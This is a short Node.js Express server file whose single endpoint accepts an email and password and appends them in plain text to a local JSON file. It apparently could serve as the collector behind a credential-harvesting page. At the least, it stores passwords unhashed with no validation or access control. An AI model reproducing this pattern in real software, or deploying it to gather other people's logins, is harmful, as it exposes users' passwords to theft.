// Save this as server.js
const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.json());

app.post('/save-credentials', (req, res) => {
  const { email, pass } = req.body;

  // Read existing data
  fs.readFile('accs.json', 'utf8', (err, data) => {
    let accounts = [];
    if (!err && data) {
      try {
        accounts = JSON.parse(data);
      } catch (e) {
        // Handle JSON parse error
        return res.json({ message: 'Error parsing existing data' });
      }
    }

    // Append new credentials
    accounts.push({ email, pass });

    // Save back to file
    fs.writeFile('accs.json', JSON.stringify(accounts, null, 2), (err) => {
      if (err) {
        return res.json({ message: 'Error saving data' });
      }
      res.json({ message: 'Credentials saved successfully' });
    });
  });
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
